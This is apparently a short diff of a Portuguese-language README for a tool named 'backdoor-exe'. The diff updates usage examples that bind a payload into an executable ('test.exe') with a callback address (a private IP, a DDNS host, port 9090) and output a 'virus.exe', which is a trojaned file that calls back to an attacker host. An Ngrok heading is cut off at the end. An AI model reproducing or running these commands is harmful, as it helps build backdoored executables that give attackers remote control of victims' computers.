@@ -9,11 +9,11 @@ Para ajuda
 
 IP:
 
-./backdoor-exe test.exe 192.168.1.143 9090 virus.exe
+./backdoor-exe -i test.exe 192.168.1.143 9090 virus.exe
 
 Host/DDNS:
 
-./backdoor-exe test.exe fuckthisn0ip.ddns.net 9090 virus.exe
+./backdoor-exe -i test.exe fuckthisn0ip.ddns.net 9090 virus.exe
 
 Ngrok:
 
